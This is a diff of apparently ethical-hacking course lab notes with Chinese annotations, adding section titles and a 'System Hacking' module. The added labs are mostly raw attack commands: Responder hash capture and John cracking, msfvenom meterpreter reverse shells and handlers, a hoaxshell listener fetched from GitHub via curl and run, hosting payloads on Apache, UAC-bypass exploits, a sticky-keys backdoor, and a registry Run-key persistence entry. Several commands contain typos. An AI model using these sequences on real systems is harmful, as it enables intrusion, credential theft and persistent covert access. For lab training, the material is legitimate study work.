@@ -1,7 +1,7 @@
-### Module 3
+### Module 3 Scanning Networks
 
 <details>
-  <summary>Lab 1</summary>
+  <summary>Lab 1 Perform Host Discovery</summary>
 
   ```console
   Tesk 1 Perrot
@@ -17,7 +17,7 @@
 </details>
 
 <details>
-  <summary>Lab 2</summary>
+  <summary>Lab 2 Perform Port and Service Discovery</summary>
 
   ```console
   Task 1 Perrot znmap
@@ -37,7 +37,7 @@
 </details>
 
 <details>
-  <summary>Lab 3</summary>
+  <summary>Lab 3 Perform OS Discovery</summary>
 
   ```console
   Task 1 Perrot
@@ -48,7 +48,7 @@
 </details>
 
 <details>
-  <summary>Lab 4</summary>
+  <summary>Lab 4 Scan beyond IDS and Firewall</summary>
 
   ```console
   Task 1 Perrot
@@ -62,7 +62,7 @@
 </details>
 
 <details>
-  <summary>Lab 5</summary>
+  <summary>Lab 5 Perform Network Scanning using Various Scanning Tools</summary>
 
   ```console
   Task 1 Perrot
@@ -87,10 +87,10 @@
   ```
 </details>
 
-### Module 4
+### Module 4 Enumeration
 
 <details>
-  <summary>Lab 1</summary>
+  <summary>Lab 1 Perform NetBIOS Enumeration</summary>
 
   ```console
   Task 1 windows
@@ -101,7 +101,7 @@
 </details>
 
 <details>
-  <summary>Lab 2</summary>
+  <summary>Lab 2 Perform SNMP Enumeration</summary>
 
   ```console
   snmpwalk -v1 -c public 10.10.1.22
@@ -111,7 +111,11 @@
 </details>
 
 <details>
-  <summary>Lab 4</summary>
+  <summary>Lab 3 Perform LDAP Enumeration</summary>
+</details>
+
+<details>
+  <summary>Lab 4 Perform NFS Enumeration</summary>
 
   ```console
   Task 1 Perrot
@@ -126,7 +130,7 @@
 </details>
 
 <details>
-  <summary>Lab 5</summary>
+  <summary>Lab 5 Perform DNS Enumeration</summary>
 
   ```console
   Task 1 Perrot
@@ -142,7 +146,7 @@
 </details>
 
 <details>
-  <summary>Lab 6</summary>
+  <summary>Lab 6 Perform SMTP Enumeration</summary>
 
   ```console
   Task 1 Perrot
@@ -152,11 +156,190 @@
   ```
 </details>
 
-### Module 5
+<details>
+  <summary>Lab 7 Perform Enumeration using Various Enumeration Tools</summary>
+</details>
+
+### Module 5 Vulnerability Analysis
 
 <details>
-  <summary>Lab 1</summary>
+  <summary>Lab 1 Perform Vulnerability Research with Vulnerability Scoring Systems and Databases</summary>
 </details>
+
+<details>
+  <summary>Lab 2 Perform Vulnerability Assessment using Various Vulnerability Assessment Tools</summary>
+</details>
+
+### Module 6 System Hacking
+
+<details>
+  <summary>Lab 1 Gain Access to the System</summary>
+  
+  ```console
+  Task 1 Perrot
+  sudo responder -I eth0
+
+  windows
+  連結\\ceh-tools
+
+  perrot
+  複製hash製作hash.txt
+  pluma hash.txt
+  john hash.txt
+  ```
+  ```console
+  Task 2 Perrot
+  docker run -d -p 80:80 reverse_shell_generator
+  打開瀏覽器 http://localhost/
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f exe -o reverse.exe
+  msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/rverse_tcp; set lhost 10.10.1.13; set lport 4444; exploit"
+  將reverse.exe複製到windows執行
+  getuid
+  複製網站HoaxShell儲存為shell.ps1
+  pluma shell.ps1
+  sudo python3 -c "$(curl -s https://raw.githubsercontent.com/t313machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t ps-iex -p 444
+
+  windows
+  cd C:\Users\Admin\Desktop\
+  .\shell.ps1
+
+  perrot
+  whoami
+  ```
+  ```console
+  Task 3 執行程式
+  ```
+</details>
+
+<details>
+  <summary>Lab 2 Perform Privilege Escalation to Gain Higher Privileges</summary>
+
+  ```console
+  Task 1 Perrot
+  cd
+  msfvenom -p windows/meterpretr/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
+    mkdir /var/www/html/share
+    chmod -R 755 /var/www/html/share
+    chown -R www-data:www-data /var /www/html/share
+  cp /home/attacker/Desktop/Windows.exe /var/www/html/share/
+  service apache2 start
+
+  msconsole
+  use exploit/multi/handler
+  set payload windows/meterpreter/reverse_tcp
+  set lhost 10.10.1.13
+  set lport 444
+  run
+
+  windows連線http://10.10.1.13/share下載Windows.exe並執行
+
+  perrot
+  sysinfo
+  getuid
+  background
+  search bypassuac
+  use exploit/windows/local/bypassuac_fodhelper
+  set session 1
+  show options
+  set LHOST 10.10.1.13
+  set TARGET 0
+  exploit
+  getsystem -t 1
+  getuid
+  background
+  use post/windows/manage/sticky_keys
+  sessions -i*
+  set session 2
+  exploit
+
+  windows
+  whoami
+  ```
+</details>
+
+<details>
+  <summary>Lab 3 Maintain Remote Access and Hide Malicious Activites</summary>
+
+  ```console
+  Task 1 執行工具
+  ```
+  ```console
+  Task 2 Perrot
+  cd
+  msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Test.exe
+  msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport 4444 -f exe > /home/attacker/Desktop/registry.exe
+    mkdir /var/www/html/share
+    chmod -R 755 /var/www/html/share
+    chmod -R www-data:www-data /var/www/html/share
+    
+  cp /home/attacker/Desktop/Test.exe /var/www/html/share/
+  cp /home/attacker/Desktop/registry.exe /var/www/html/share/
+  service apache2 start
+  msfconsole
+  use exploit/multi/handler
+  set payload windows/meterpreter/reverse_tcp
+  set lhost 10.10.1.13
+  set lport 444
+  run
+
+  windows開啟http://10.10.1.13/share下載執行Test.exe
+
+  perrot
+  getuid
+  background
+  use exploit/windows/local/bypassuac_silentcleanup
+  set session 1
+  show options
+  set LHOST 10.10.1.13
+  set TARGET 0
+  exploit
+  getsystem -t 1
+  getuid
+  shell
+  reg add HKLM\Software\Microsoft\Windows\CurrenVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"
+
+  開其他視窗
+  msfconsole
+  use exploit/multi/handler
+  set payload windows/meterpreter/reverse_tcp
+  set lhost 10.10.1.13
+  set lport 4444
+  exploit
+
+  重啟windows
+
+  getuid
+  ```
+</details>
+
+<details>
+  <summary>Lab 4 Clear Logs to Hide the Evidence of Compromise</summary>
+</details>
+
+<details>
+  <summary>Lab 5 Perform Active Directory (AD) Attacks Using Various Tools</summary>
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
